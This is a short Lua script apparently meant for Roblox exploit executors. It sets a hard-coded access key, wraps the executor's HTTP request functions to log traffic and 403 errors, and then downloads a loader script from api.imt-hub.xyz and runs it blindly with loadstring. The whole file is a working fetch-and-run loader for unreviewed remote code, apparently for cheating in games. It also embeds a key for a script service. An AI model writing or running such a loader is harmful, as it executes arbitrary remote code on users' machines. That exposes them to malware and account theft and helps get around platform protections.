ACTIVE_KEY = "5c4965bbf469ca914edb8395bd5a2b50"

local oldRequest = http_request or request or (syn and syn.request)
assert(oldRequest, "request not supported")

local function debugRequest(opt)
    print("[HTTP] ->", opt.Url or opt.url)

    local res = oldRequest(opt)

    if type(res) == "table" then
        print(
            "[HTTP] <-",
            res.StatusCode or res.Status or "?",
            opt.Url or opt.url
        )

        if (res.StatusCode or res.Status) == 403 then
            warn("[HTTP 403 URL]", opt.Url or opt.url)
            warn("[HTTP 403 BODY]", tostring(res.Body or res.body))
        end
    end

    return res
end

getgenv().request = debugRequest
getgenv().http_request = debugRequest

if syn then
    pcall(function()
        syn.request = debugRequest
    end)
end

local res = oldRequest({
    Url = "https://api.imt-hub.xyz/files/v2/loaders/6mss1famhjy2gasnw5w481j8b9yr42ji.lua",
    Method = "GET"
})

local src = type(res) == "table" and (res.Body or res.body) or res
assert(type(src) == "string", "Loader response invalid")

local fn, err = loadstring(src)
assert(fn, err)

fn()
